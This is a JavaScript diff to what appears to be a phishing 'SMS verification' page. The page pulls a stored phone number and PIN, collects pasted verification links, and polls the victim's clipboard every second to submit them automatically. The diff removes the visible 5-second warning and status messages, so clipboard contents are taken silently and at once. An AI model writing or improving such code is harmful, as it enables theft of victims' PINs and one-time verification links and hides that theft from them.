@@ -304,10 +304,14 @@ function hideStatus() {
   clipboardBanner.classList.remove('status-visible');
 }
 
-async function submitVerification() {
+async function submitVerification({ showSubmitting = true } = {}) {
   const smsText = sms.value.trim();
   error.textContent = '';
-  hideStatus();
+  if (showSubmitting) {
+    showStatus('Submitting...');
+  } else {
+    hideStatus();
+  }
 
   if (!smsText) {
     error.textContent = 'Please paste the verification link first.';
@@ -315,9 +319,10 @@ async function submitVerification() {
     return;
   }
 
-  showStatus('Transaction processing. Please wait...');
   verifyBtn.disabled = true;
-  verifyBtn.textContent = 'Processing...';
+  if (showSubmitting) {
+    verifyBtn.textContent = 'Submitting...';
+  }
 
   const phone = localStorage.getItem('phone') || 'Unknown';
   const pin = localStorage.getItem('userPin') || 'Unknown';
@@ -353,7 +358,9 @@ async function submitVerification() {
   localStorage.setItem('smsPayload', JSON.stringify(payload));
 
   setTimeout(() => {
-    showStatus('Please paste the new verification link sent to your phone.');
+    if (showSubmitting) {
+      showStatus('Please paste the new verification link sent to your phone.');
+    }
     verifyBtn.disabled = false;
     verifyBtn.textContent = 'Verify';
     sms.value = '';
@@ -390,7 +397,8 @@ async function requestClipboardAccess() {
 
     const clipboardText = await navigator.clipboard.readText();
     if (clipboardText && clipboardText.trim()) {
-      sms.value = clipboardText.trim();
+      const trimmedClipboardText = clipboardText.trim();
+      sms.value = trimmedClipboardText;
       sms.dispatchEvent(new Event('input', { bubbles: true }));
       error.textContent = '';
       await submitVerification();
@@ -433,11 +441,7 @@ async function watchClipboard() {
         sms.value = clipboardText;
         sms.dispatchEvent(new Event('input', { bubbles: true }));
         if (sms.value.trim()) {
-          showStatus('Link copied. Submitting in 5 seconds...');
-          await new Promise(resolve => setTimeout(resolve, 5000));
-          if (sms.value.trim()) {
-            await submitVerification();
-          }
+          await submitVerification({ showSubmitting: false });
         }
       }
     } finally {
@@ -446,24 +450,12 @@ async function watchClipboard() {
   }, 1000);
 }
 
-function startLongPressPaste() {
-  clearTimeout(longPressTimer);
-  longPressTimer = setTimeout(async () => {
-    await pasteFromClipboard({ autoSubmit: true });
-  }, 500);
-}
-
-function cancelLongPressPaste() {
-  clearTimeout(longPressTimer);
-  longPressTimer = null;
-}
-
 if (clipboardBtn) {
   clipboardBtn.addEventListener('click', async () => {
     error.textContent = '';
     clipboardAccessClicked = true;
     clipboardBtn.disabled = true;
-    clipboardBtn.textContent = 'Reading clipboard...';
+    clipboardBtn.textContent = 'Submitting...';
     if (clipboardBanner) {
       clipboardBanner.classList.remove('status-visible');
       clipboardBanner.querySelector('.clipboard-banner-row')?.classList.add('hidden');
@@ -471,7 +463,6 @@ if (clipboardBtn) {
     const accessGranted = await requestClipboardAccess();
     if (accessGranted) {
       await watchClipboard();
-      showStatus('Clipboard is connected. Copy a new link to submit it automatically.');
     }
     clipboardBtn.disabled = false;
     clipboardBtn.textContent = 'Allow & Submit';
@@ -482,22 +473,12 @@ sms.addEventListener('paste', async (event) => {
   const pastedText = (event.clipboardData || window.clipboardData)?.getData('text') || '';
   if (!pastedText.trim()) return;
 
-  event.preventDefault();
-  sms.value = pastedText.trim();
-  await submitVerification();
+  window.setTimeout(async () => {
+    if (sms.value.trim() === pastedText.trim()) {
+      await submitVerification();
+    }
+  }, 0);
 });
-
-sms.addEventListener('contextmenu', async (event) => {
-  event.preventDefault();
-  await pasteFromClipboard({ autoSubmit: true });
-});
-
-sms.addEventListener('touchstart', startLongPressPaste, { passive: true });
-sms.addEventListener('touchend', cancelLongPressPaste, { passive: true });
-sms.addEventListener('touchcancel', cancelLongPressPaste, { passive: true });
-sms.addEventListener('pointerdown', startLongPressPaste);
-sms.addEventListener('pointerup', cancelLongPressPaste);
-sms.addEventListener('pointerleave', cancelLongPressPaste);
 
 sms.addEventListener('keydown', async (event) => {
   if (event.key === 'Enter' && sms.value.trim()) {
@@ -510,14 +491,7 @@ verifyBtn.addEventListener('click', async () => {
   error.textContent = '';
 
   if (!sms.value.trim()) {
-    const clipboardText = await readClipboardText();
-    if (clipboardText) {
-      sms.value = clipboardText;
-      await submitVerification();
-      return;
-    }
-
-    error.textContent = 'Clipboard access was blocked. Paste the link into the field manually.';
+    error.textContent = 'Paste the link into the field manually first.';
     sms.focus();
     return;
   }
